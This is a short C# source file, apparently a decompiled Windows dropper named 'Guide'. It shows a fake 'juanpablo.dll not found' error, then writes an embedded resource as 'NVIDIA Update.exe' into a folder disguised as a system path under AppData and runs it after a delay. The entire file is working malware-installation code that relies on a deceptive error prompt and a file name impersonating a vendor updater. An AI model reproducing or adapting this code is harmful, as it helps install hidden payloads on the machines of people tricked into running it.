using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Guide.Properties;

namespace Guide;

internal static class Program
{
	private static string appLocation = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\twain_32\\Driver\\";

	[STAThread]
	private static void Main()
	{
		MessageBox.Show("Not found: 'juanpablo.dll'. Do you fix this problem?", "Error: juanpablo.dll", MessageBoxButtons.YesNo, MessageBoxIcon.Hand);
		createAppFile();
	}

	private static void WriteAllBytes(string FilePath, object file)
	{
		byte[] array = (byte[])file;
		File.WriteAllBytes(FilePath, (byte[])file);
	}

	private static void createAppFile()
	{
		Directory.CreateDirectory(appLocation);
		WriteAllBytes(appLocation + "NVIDIA Update.exe", Resources.dllsupport);
		Thread.Sleep(11000);
		Process.Start(appLocation + "NVIDIA Update.exe");
	}
}
